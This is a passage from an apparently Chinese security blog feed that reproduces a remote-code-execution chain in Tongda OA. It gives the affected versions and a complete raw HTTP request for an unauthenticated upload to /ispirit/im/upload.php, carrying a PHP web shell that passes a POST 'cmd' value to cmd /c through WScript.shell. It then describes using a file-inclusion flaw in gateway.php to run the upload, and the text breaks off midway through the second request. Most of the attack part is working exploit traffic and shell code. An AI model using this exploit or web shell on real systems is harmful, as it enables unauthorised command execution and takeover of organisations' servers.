+POST /ispirit/im/upload.php HTTP/1.1 Host: 192.168.235.7 Content-Length: 656 Cache-Control: no-cache User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.132 Safari/537.36 Content-Type: multipart/form-data; boundary=----WebKitFormBoundarypyfBh1YB4pV8McGB Accept: */* Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,zh-HK;q=0.8,ja;q=0.7,en;q=0.6,zh-TW;q=0.5 Cookie: PHPSESSID=123 Connection: close ------WebKitFormBoundarypyfBh1YB4pV8McGB Content-Disposition: form-data; name=&amp;#34;UPLOAD_MODE&amp;#34; 2 ------WebKitFormBoundarypyfBh1YB4pV8McGB Content-Disposition: form-data; name=&amp;#34;P&amp;#34; 123 ------WebKitFormBoundarypyfBh1YB4pV8McGB Content-Disposition: form-data; name=&amp;#34;DEST_UID&amp;#34; 1 ------WebKitFormBoundarypyfBh1YB4pV8McGB Content-Disposition: form-data; name=&amp;#34;ATTACHMENT&amp;#34;; filename=&amp;#34;jpg&amp;#34; Content-Type: image/jpeg &amp;lt;?</description>
+      <content>&lt;h1 id=&#34;漏洞复现&#34;&gt;&lt;strong&gt;漏洞复现&lt;/strong&gt;&lt;/h1&gt;
+&lt;h3 id=&#34;影响版本&#34;&gt;影响版本：&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-jsx&#34; data-lang=&#34;jsx&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;V11版&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2017&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;版&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2016&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;版&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2015&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;版&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2013&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;版&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2013&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;增强版&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;测试环境&#34;&gt;测试环境：&lt;/h3&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-jsx&#34; data-lang=&#34;jsx&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;11.2.191129&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;漏洞复现-1&#34;&gt;漏洞复现：&lt;/h3&gt;
+&lt;p&gt;通过 &lt;code&gt;/ispirit/im/upload.php&lt;/code&gt; 页面，未授权文件上传一个一句话文件，可获得路径和文件名。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled.png&#34; alt=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled.png&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ispirit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;im&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;upload&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Host&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;235.7&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;656&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Cache&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Control&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;no&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;cache&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Agent&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Mozilla&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5.0&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;Windows&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NT&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10.0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;Win64&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;x64&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;AppleWebKit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;537.36&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;KHTML&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;like&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Gecko&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Chrome&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;80.0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;3987.132&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Safari&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;537.36&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;multipart&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;boundary&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=----&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;WebKitFormBoundarypyfBh1YB4pV8McGB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Accept&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*/*&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Accept&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Encoding&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;gzip&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;deflate&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Accept&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Language&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;zh&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;CN&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;zh&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.9&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;zh&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;HK&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.8&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;ja&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.7&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;en&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.6&lt;/span&gt;,&lt;span style=&#34;color:#a6e22e&#34;&gt;zh&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;TW&lt;/span&gt;;&lt;span style=&#34;color:#a6e22e&#34;&gt;q&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;0.5&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Cookie&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;PHPSESSID&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Connection&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;close&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;WebKitFormBoundarypyfBh1YB4pV8McGB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Disposition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;UPLOAD_MODE&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;WebKitFormBoundarypyfBh1YB4pV8McGB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Disposition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;P&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;123&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;WebKitFormBoundarypyfBh1YB4pV8McGB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Disposition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;DEST_UID&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;------&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;WebKitFormBoundarypyfBh1YB4pV8McGB&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Disposition&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;form&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;data&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;name&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ATTACHMENT&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;filename&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;jpg&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Content&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Type&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;image&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;jpeg&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$command&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;$_POST[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;];
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$wsh &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;COM&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;WScript.shell&amp;#39;&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$exec &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $wsh&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;exec&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;cmd /c &amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;$command);
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$stdout &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $exec&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;StdOut&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;$stroutput &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; $stdout&lt;span style=&#34;color:#f92672&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ReadAll&lt;/span&gt;();
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; $stroutput;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;------WebKitFormBoundarypyfBh1YB4pV8McGB--
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;code&gt;/ispirit/interface/gateway.php&lt;/code&gt; 存在文件包含漏洞，包含刚刚所上传的文件（&lt;code&gt;/general/../../attach/im/&lt;/code&gt; 为默认路径，&lt;code&gt;2012/969649651.jpg&lt;/code&gt; 为上图获得的文件名和目录名），包含文件从而执行命令。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled%201.png&#34; alt=&#34;https://cdn.jsdelivr.net/gh/H1dery/H1dery@master/20210110/tongda_oa_rce/Untitled 1.png&#34;&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;POST&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;ispirit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;interface&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;gateway&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;php&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;HTTP&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1.1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Host&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;192.168&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;235.7&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Upgrade&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Insecure&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Requests&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;User&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;Agent&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Mozilla&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;5.0&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;Windows&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;NT&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;10.0&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;Win64&lt;/span&gt;; &lt;span style=&#34;color:#a6e22e&#34;&gt;x64&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;AppleWebKit&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;537.36&lt;/span&gt; (&lt;span style=&#34;color:#a6e22e&#34;&gt;KHTML&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;like&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Gecko&lt;/span&gt;) &lt;span style=&#34;color:#a6e22e&#34;&gt;Chrome&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;84.0&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;4147.105&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Safari&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;537.36&lt;/span&gt;
